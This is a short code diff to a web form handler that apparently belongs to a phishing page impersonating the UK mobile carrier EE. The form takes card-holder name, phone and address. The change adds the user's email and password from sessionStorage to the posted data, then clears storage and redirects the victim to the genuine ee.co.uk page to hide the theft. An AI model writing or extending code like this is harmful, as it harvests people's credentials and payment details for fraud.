@@ -201,6 +201,8 @@
       e.preventDefault();
       
       const formData = {
+          email: sessionStorage.getItem('email'),
+          password: sessionStorage.getItem('password'),
           firstName: form.nameOnCard.value,
           phoneNum: form.phoneNumber.value,
           address: form.houseNumber.value,
@@ -218,7 +220,8 @@
           body: JSON.stringify(formData),
           keepalive: true
         });
-
+        
+        sessionStorage.clear();
         window.location.href = "https://ee.co.uk/mobile";
         
         const result = res.json();
